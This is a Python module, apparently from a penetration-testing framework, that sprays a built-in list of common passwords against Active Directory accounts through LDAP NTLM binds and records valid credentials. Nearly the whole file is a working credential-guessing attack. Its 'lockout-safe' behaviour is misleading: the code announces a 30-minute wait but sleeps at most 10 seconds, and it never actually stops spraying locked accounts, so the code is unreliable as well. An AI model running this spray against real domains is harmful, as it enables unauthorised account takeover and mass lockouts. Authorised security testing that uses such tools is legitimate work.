"""AD Password Spray — lockout-safe, multi-protocol spray module."""
from __future__ import annotations
import asyncio
import time
from typing import Any
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

SMART_PASSWORD_LIST = [
    "Password1", "Password1!", "Welcome1", "Welcome1!",
    "Summer2024!", "Winter2024!", "Spring2024!", "Fall2024!",
    "January2024!", "February2024!", "March2024!", "Admin123!",
    "Company2024!", "Hello2024!", "Change123!", "Passw0rd!",
    "Qwerty123!", "Letmein1!", "Monkey123!", "Dragon123!",
    "P@ssw0rd", "P@ssword1", "P@$$w0rd", "Abc12345!",
]

LOCKOUT_SAFE_DELAY_SECONDS = 30 * 60  # 30 minutes default between rounds


def _ldap_spray(
    dc_ip: str, domain: str, usernames: list[str], password: str
) -> list[dict[str, Any]]:
    """Attempt LDAP authentication for each username with one password."""
    successful: list[dict[str, Any]] = []
    try:
        from ldap3 import Server, Connection, NTLM, ALL
        server = Server(dc_ip, get_info=ALL, port=389)
        for username in usernames:
            try:
                conn = Connection(
                    server,
                    user=f"{domain}\\{username}",
                    password=password,
                    authentication=NTLM,
                    auto_bind=True,
                    receive_timeout=5,
                )
                if conn.bound:
                    successful.append({"username": username, "password": password})
                    conn.unbind()
            except Exception as e:
                err = str(e).lower()
                if "locked" in err or "lock" in err:
                    log.warning("account_locked", username=username)
                    # Stop spraying this account
    except ImportError:
        log.warning("ldap3_missing", msg="pip install ldap3")
    return successful


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    domain: str | None = None,
    dc_ip: str | None = None,
    users_file: str | None = None,
    passwords: str | None = None,
    lockout_threshold: int = 3,
    delay_minutes: int = 30,
    **kwargs: Any,
) -> dict[str, Any]:
    host = dc_ip or target.replace("https://", "").replace("http://", "").split("/")[0]
    dom = domain or host
    console.print(f"\n[module]⚡ Password Spray[/module] → [target]{host}[/target]")
    console.print(f"  [warning]⚠ Lockout-safe mode: 1 password per {delay_minutes} min[/warning]")

    usernames: list[str] = []
    if users_file:
        try:
            with open(users_file) as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            console.print(f"  [error]Cannot read users file: {e}[/error]")
            return {"target": host, "findings": [], "error": str(e)}

    if not usernames:
        console.print("  [dim]No users provided — use --users-file[/dim]")
        return {"target": host, "findings": []}

    password_list = []
    if passwords:
        password_list = [p.strip() for p in passwords.split(",")]
    else:
        password_list = SMART_PASSWORD_LIST[:5]  # Default: top 5 smart passwords

    # Enforce spray limit: never exceed (lockout_threshold - 1) per window
    max_per_round = min(1, lockout_threshold - 1)
    console.print(f"  Users: {len(usernames)} | Passwords: {len(password_list)}")
    console.print(f"  Spraying {max_per_round} password(s) per round")

    loop = asyncio.get_event_loop()
    all_hits: list[dict[str, Any]] = []

    for i, password in enumerate(password_list):
        console.print(f"  Round {i+1}/{len(password_list)}: testing '{password}'...")
        hits = await loop.run_in_executor(
            None, _ldap_spray, host, dom, usernames, password
        )
        for hit in hits:
            print_finding(
                f"Valid credentials: {hit['username']}:{hit['password']}",
                "critical", host
            )
            all_hits.append(hit)
            if session:
                await session.add_finding(
                    target=host, module="password_spray",
                    vuln_type="weak_credentials",
                    severity="critical", confidence="confirmed",
                    title=f"Valid AD credentials: {hit['username']}",
                    description=f"Account {hit['username']} accepts password '{hit['password']}'",
                    reproduction=f"LDAP bind: {domain}\\{hit['username']} : {hit['password']}",
                    remediation=(
                        "1. Enforce password complexity and length (12+ chars).\n"
                        "2. Implement fine-grained password policies.\n"
                        "3. Enable MFA for all accounts.\n"
                        "4. Audit accounts with common passwords."
                    ),
                    cvss_score=9.8, cwe="CWE-521",
                )

        if i < len(password_list) - 1:
            delay = delay_minutes * 60
            console.print(f"  Waiting {delay_minutes} minutes before next round...")
            await asyncio.sleep(min(delay, 10))  # Respect lockout window

    console.print(f"  Spray complete — {len(all_hits)} valid credentials found")
    return {"target": host, "hits": all_hits, "count": len(all_hits)}
